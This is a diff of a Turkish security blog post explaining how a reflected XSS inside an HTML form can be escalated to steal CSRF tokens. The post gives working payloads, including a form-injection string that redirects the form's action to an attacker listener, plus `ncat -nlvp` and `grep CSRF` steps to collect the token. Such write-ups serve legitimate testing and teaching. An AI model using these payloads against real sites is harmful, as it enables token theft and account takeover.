@@ -26,16 +26,14 @@ Ben Samet ŞAHİN.
 Yaptığımız testlerde bulduğumuz aynı tür açıklar her zaman aynı potansiyel zarara (impact) sahip olmayabiliyor. 
 
 Örneğin;
-Kurbana otomatik olarak çıkış yaptıran CSRF açığı (Bu genellikle açık kapsamına bile girmez.) ile kurbana otomatik olarak eposta ve parola değişikliği yaptıran CSRF (*1) açığı elbette aynı zararı veremez.
-
+Kurbana otomatik olarak çıkış yaptıran CSRF açığı (Bu genellikle açık kapsamına bile girmez.) ile kurbana otomatik olarak eposta ve parola değişikliği yaptıran CSRF (\*1) açığı elbette aynı potansiyel zarara sahip değildir.
 
   
-
-Şimdi, bu yazının konusuna gelelim. Elimizde iki adet XSS (Cross Site Scripting) açığı ve HTML kaynak kodundaki bir *input* tagına yansımış CSRF tokenlerimiz (*2) var. 
+Öyleyse, bu yazının konusuna gelelim. Elimizde iki adet XSS (Cross Site Scripting) açığı ve HTML kaynak kodundaki bir *input* tagına yansımış CSRF tokenlerimiz (\*2) var. 
   
 
 ## Normal XSS Açığı :  
-Çirkin bir arama kutusu olduğunu, sitenin kaynak kodlarında CSRF Tokenlerin bulunduğunu ve bir inputun değerini, *GET* isteğindeki *search* parametresinden aldığını görüyoruz. (*3)
+Websitesinde bir arama kutusu olduğunu görüyoruz. Sitenin kaynak kodlarında CSRF Tokenlerin bulunduğunu ve bir inputun değerini, *GET* isteğindeki *search* parametresinden aldığını görüyoruz. (\*3)
 
 ```php
 <?php 
@@ -52,14 +50,14 @@ $printMD5 = md5($benCSRFtoken);
 ```
 
 
-Elimizde şu an için hiçbir açık yok fakat görüyoruz ki *search* parametresi hiçbir sanitizasyon (*4) işlemi yapılmamış. Bu durumda diyebiliriz ki buradan bir XSS açığı çıkabilir. (*5) Açığı bulmamız için GET metoduyla search parametresine bir payload (*6) gönderiyoruz ;
+Elimizde şu an için hiçbir açık yok fakat testlerden sonra görüyoruz ki *search* parametresi için hiçbir sanitizasyon (\*4) işlemi yapılmamış. Bu durumda diyebiliriz ki buradan bir XSS açığı çıkabilir. (\*5) Açığı bulmamız için GET metoduyla search parametresine bir payload (\*6) gönderiyoruz.
 `"><h1>xss`  gönderdik ve kaynak kodunu inceledik : 
 
 <img src="/images/Blog-1.png">
 
 
-Evet, başarılı bir şekilde valuenin tırnaklarını kapattık ve artık kendi HTML kodumuzu site üzerinde çalıştırabileceğimizi gördük. Şimdi XSS kanıtı için JavaScript kodunu çalıştırmamız gerekiyor. Bu seferki açık kodumuz ;
-`"><script>alert(1)</script>` (*7) gönderdik ve kaynak kodunu inceledik :
+Evet, başarılı bir şekilde value attribute'inin tırnaklarını kapattık ve artık kendi zararlı kodumuzu site üzerinde çalıştırabileceğimizi gördük. Şimdi XSS'in varlığının kanıtı için herhangi JavaScript kodunu çalıştırmamız gerekiyor. Bu seferki payloadımız:
+`"><script>alert(1)</script>` (\*7) gönderdik ve kaynak kodunu inceledik:
 
 <img src="/images/Blog-2.png">
 
@@ -87,18 +85,18 @@ $printMD5 = md5($benCSRFtoken);
 
 
 **Trick zamanı :**  
-Örneklerle de gördüğümüz gibi iki tane XSS ve input taglarına yansıtılmış CSRF tokenlerini gördük. Eğer `<form>` tagı ve CSRF tokeninin yansıtılmış olduğu input tagının arasında XSS açığına sahipseniz, CSRF tokenlerini de çalabilirsiniz. Bu gerçek ve daha önce pek çok kez karşılaştığım bir senaryo ama Sadece Kritik XSS açığında işe yarar. Neden mi ?
+Örneklerle de gördüğümüz gibi iki tane XSS ve input taglarına yansıtılmış CSRF tokenlerini gördük. Eğer `<form>` tagı ve CSRF tokeninin yansıtılmış olduğu input tagının arasında XSS açığına sahipseniz, CSRF tokenlerini de çalabilirsiniz. Bu gerçek ve daha önce pek çok kez karşılaştığım bir senaryo ama sadece Kritik XSS açığında işe yarar. Neden mi ?
 
-- Çünkü HTML dilinde değişken tanımlayıp sonra kullanma gibi bir ihtimaliniz yoktur. Yani yukarıda bir CSRF Tokenli input varsa ve siz aşağıdaki tagda kod çalıştırabiliyorsanız, o CSRF Tokenine XSS açığı ile erişemezsiniz. (*8)
+- Çünkü HTML dilinde değişken tanımlayıp sonra kullanma gibi bir ihtimaliniz yoktur. Yani yukarıda bir CSRF Tokenli input varsa ve siz aşağıdaki tagda kod çalıştırabiliyorsanız, o CSRF Tokenine XSS açığı ile erişemezsiniz. Elbette JavaScript dilinin yardımlarıyla `getElementById` gibi komutlarla da bu işi yapabilirsiniz. Fakat asıl nokta, bu işi en kısa ve en az JavaScript yardımıyla halletmektir. Güvenlik Header'larının kullanımının artmasıyla birlikte bu trick önem kazanıyor. (\*8)
 
--  Yukarıda da değindiğim gibi `<form>` ve `</form>` tagları arasında ve CSRF Token'in yansıtılmış olduğu `<input>` tagının üstünde çalışan bir XSS açığına olmanız gerekmektedir. Eğer bu ikisine de sahipseniz CSRF tokenlerini rahatlıkla çalabilirsiniz.
+-  Yukarıda da değindiğim gibi `<form>` ve `</form>` tagları arasında ve CSRF Token'in yansıtılmış olduğu ve herhangi bir tagın içinde çalışan bir XSS açığına olmanız gerekmektedir. Eğer bu ikisine de sahipseniz CSRF tokenlerini rahatlıkla çalabilirsiniz.
 
 
 
 **O zaman exploit edelim :**  
-Öncelikle XSS açığıyla CSRF tokenlerini çalabilmek için güzel bir payload yazmamız gerekiyor. Paylaodımızın  mantığı şu olmalı : 
+Öncelikle XSS açığıyla CSRF tokenlerini çalabilmek için güzel bir payload yazmamız gerekiyor. Paylaodımızın  prensibi şu olmalı : 
 - Daha önce açılmış olan formu kapat : `"></form>`
-- Yeni bir form aç ve action (*9) eventine dinlediğin ip ve port'u gir (*10) : `"></form><form method="GET" action="http://127.0.0.1:667/bla.html">`
+- Yeni bir form aç ve action (\*9) action attribute'üne dinlediğin ip ve port'u gir (\*10) : `"></form><form method="GET" action="http://127.0.0.1:667/bla.html">`
 - Ncat ile seçili portu (667) dinle : `ncat -nlvp 667`
 - Kullanıcıyı butona tıklat ve loglardan CSRF Token'ini çek : `| grep CSRF`
 
@@ -109,42 +107,40 @@ Exploit videosu burada :
 </video>
 
 
-
-
 **SONUÇ :**  
-Değerli içerik taşıyan input tagının ve açıklı input tagının sırası bile bir açığın zararını arttıracak kadar önemli olabiliyor. Bu yüzden manuel testler yapmanız ve bunun gibi trickleri deneyerek öğrenmeniz çok önemli. Deneyebilmeniz için Github'a XSS açıklı 2 dosyayı da koyuyorum. Kendi tricklerimi ve işinize yarayabilecek trickleri paylaştığım Twitter ve LinkedIn hesaplarımdan bana ulaşabilirsiniz. 
+Değerli içerik taşıyan tagların ve açıklı tagların sırası bile bir açığın zararını arttıracak kadar önemli olabiliyor. Bu yüzden manuel testler yapmanız ve bunun gibi trickleri deneyerek öğrenmeniz çok önemli. Deneyebilmeniz için Github'a XSS açıklı 2 dosyayı da koyuyorum. Kendi tricklerimi ve işinize yarayabilecek trickleri paylaştığım Twitter ve LinkedIn hesaplarımdan bana ulaşabilirsiniz. 
 
 
 [Github](https://github.com/sametsahinnet/XSS-Blog-Post)
 
   ----
 
-***1** :
+**1** :
 Bu açık hakkında yazımı okuyabilirsiniz : https://sametsahin.net/posts/account-takeover-via-reset-password/
 
-***2** :
-CSRF açığının oluşmasını engellemek için her istek veya kullanıcıya göre değişen uzun ve rastgele değerdir. Bu tokenlerin olmadığı durumlarda CSRF açığı meydana gelebilir.
+**2** :
+Anti-CSRF tokenleri, CSRF açığının oluşmasını engellemek için her istek veya kullanıcıya göre değişen uzun ve rastgele değerlerdir. Bu tokenlerin olmadığı ve esktra güvenlik önlemlerinin alınmadığı durumlarda CSRF açığı meydana gelebilir.
 
-***3** :
+**3** :
 Bu kısım temel Web bilgisine dayandığı için Google'dan bulabilirsiniz.
 
-***4** :
+**4** :
 Sanitizasyon, diğer adıyla filtreleme işlemleri, kullanıcıdan direkt olarak alınan girdilerin, açıklara dönüşmesini engellemek için kullanılan güvenli kod yazma tekniğidir. Pek çok açık gerekli sanitizasyon işleminin yapılmaması veya yeterince kapsamlı olmamasından kaynaklanır.
 
-***5** :
-Elbette XSS çıkar bu doğru. Yanlış olan oradan sadece XSS çıkacağı düşüncesidir. Özellikle bu işlere yeni başladıysanız sadece bir açık bulmaya çalışırsınız. Yapmanız gereken bir açıktan en fazla ne kadar ileriye gidebileceğinizi denemektir. Herkes XSS bulabilir ama sizin farkınız XSS'ten CSRF'e gitmenizdir.
+**5** :
+Elbette XSS çıkar bu doğru. Yanlış olan oradan sadece XSS çıkacağı düşüncesidir. Özellikle bu işlere yeni başladıysanız sadece bir açık bulmaya çalışırsınız. Yapmanız gereken bir açıktan en fazla ne kadar ileriye gidebileceğinizi denemektir. Herkes XSS bulabilir ama sizin farkınız XSS'ten diğer açıklara ulaşmanız olmalı.
 
-***6** :
+**6** :
 Payload, açıkları bulmak ve sömürmek için hacker tarafından yazılan kodlardır. Payloadlara, açık kodları diyebiliriz. Ve payloadlar yeşil renkle ekrandan hızlıca akıp gitmez :)
 
-***7** :
-Normalde böyle bir payload çok az yerde çalışır. Payloadlarınızın kalitesini arttırmanız için elle yazmalı ve her tuşun kaynak kodunda yansımış olduğu yerlere dikkatlice bakmalısınız. Yani her deneyişinizde websitenin yanıtını kontrol etmelisiniz.
+**7** :
+Normalde böyle bir payload çok az yerde çalışır. Payloadlarınızın kalitesini arttırmanız için elle yazmalı ve her tuşun kaynak kodunda yansımış olduğu yerleri dikkatlice incelemelisiniz. Yani her payloadınızla birlikte websitenin yanıtını kontrol etmelisiniz.
 
-***8** :
-Hayır, erişebilirsiniz. Ama bunun ihtimali çok düşüktür. JavaScript kullanarak input içinde yer alan değerleri ekrana basabilirsiniz. Fakat bunun için uzun ve içinde `<script>` tagının kullanılmış olduğu bir payload yazmak zorundasınız. Ve ödül verecek kadar büyük tüm şirketler o `<script>` tagını gördüğü anda sizi engeller. Bu yüzden bulsanız bulsanız küçük yerlerde bulursunuz ve o küçük yerler de küçük olduğu için CSRF token zaten kullanmamış olur ;)
+**8** :
+Hayır, erişebilirsiniz. Ama bunun ihtimali düşüktür. 
 
-***9** :
-HTML'de form tagı açıldığı zaman bir de onu kapatmanız gerekir. Biz kapanmış form (`</form>`) tagı enjekte ettiğimiz zaman görüntü şu şekilde olur : 
+**9** :
+HTML'de nir form tagı açtığınız zaman onu kapatmanız gerekir. Biz kapanmış form (`</form>`) tagı enjekte ettiğimiz zaman görüntü şu şekilde olur : 
 
 
 ```html
@@ -170,7 +166,7 @@ ve
 </form>
 ```
 
-Baştan beri amacımız CSRF Tokeni içeren form'u kontrol edebilmekti. Action kısmını değiştirdiğimiz anda artık CSRF Tokeni içeren her istek bizim loglarımıza düşecek ve oradan okuyabileceğiz.
+Baştan beri amacımız CSRF Tokeni içeren form'u kontrol edebilmekti. Action attribute'ünü değiştirdiğimiz anda artık CSRF Tokeni içeren her istek bizim loglarımıza düşecek ve oradan Tokeni elde edebileceğiz.
 
 ***10** :
 CSRF Token'ine loglardan erişebilmemiz için logların bizde olması gerekir. Bu yüzden kendi localimizde rastgele bir portu dinliyoruz. Bu işlemi `ncat` ile yapabilirsiniz : 
@@ -182,4 +178,5 @@ CSRF Token'ine loglardan erişebilmemiz için logların bizde olması gerekir. B
 
 
 Değerli zamanınız için teşekkür ederim.  
-Bol açıklar :)
+
+Samet ŞAHİN   
